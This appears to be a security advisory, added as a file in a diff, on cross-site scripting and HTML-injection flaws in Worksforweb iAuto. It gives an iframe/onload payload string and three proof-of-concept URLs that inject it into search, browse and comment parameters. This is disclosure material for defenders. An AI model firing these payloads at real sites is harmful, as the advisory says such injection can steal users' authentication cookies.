@@ -1,0 +1,46 @@
+source: http://www.securityfocus.com/bid/54812/info
+
+Worksforweb iAuto is prone to multiple cross-site scripting and HTML-injection vulnerabilities because it fails to properly sanitize user-supplied input.
+
+Successful exploits will allow attacker-supplied HTML and script code to run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible. 
+
+Review:  Add Comments - Listing
+
+<div class="addComment">
+<h1>Reply to The Comment</h1>
+<div class="pageDescription">
+<div class="commentInfo">You are replying to the comment 
+#"><iframe src="iAuto%20%20%20Listing%20Comments%20Reply%20to%20The%20Comment-Dateien/[PERSISTENT INJECTED CODE!])' 
+<="" to="" 
+listing="" #448="" "<span="" class="fieldValue fieldValueYear" height="900" width="1000">2007</span>
+<span class="fieldValue fieldValueMake">Acura</span> 
+
+
+
+1.2
+The client side cross site scripting vulnerabilities can be exploited by remote attackers with medium or highr equired 
+user inter action.
+Fo demonstration or reproduce ...
+
+String: "><iframe src=http://vuln-lab.com width=1000 height=900 onload=alert("VulnerabilityLab") <
+
+Dealer > Search Sellers > City
+
+PoC:
+http://www.example.com/iAuto/m/users/search/?DealershipName[equal]=jamaikan-hope23&City[equal]=%22%3E%3Ciframe+src%3Dhttp%3A%2F%2Fvuln-lab.com+
+width%3D1000+height%3D900+onload%3Dalert%28%22VulnerabilityLab%22%29+%3C&State[equal]=11&action=search
+
+
+Browse by Make and Model / AC Cobra / >
+
+PoC:
+http://www.example.com/iAuto/m/browse-by-make-model/AC+Cobra/%22%3E%3Ciframe%20src=http://vuln-lab.com%20
+width=1000%20height=900%20onload=alert%28%22VulnerabilityLab%22%29%20%3C/
+
+
+Comments > Reply to The Comment > Topic & Text (commentSid)
+
+PoC:
+http://www.example.com/iAuto/m/comment/add/?listingSid=448&commentSid=%22%3E%3Ciframe%20src=http://vuln-lab.com%20width=1000
+%20height=900%20onload=alert%28%22VulnerabilityLab%22%29%20%3C&returnBackUri=%2Flisting%2Fcomments%2F448%2F%3F
+
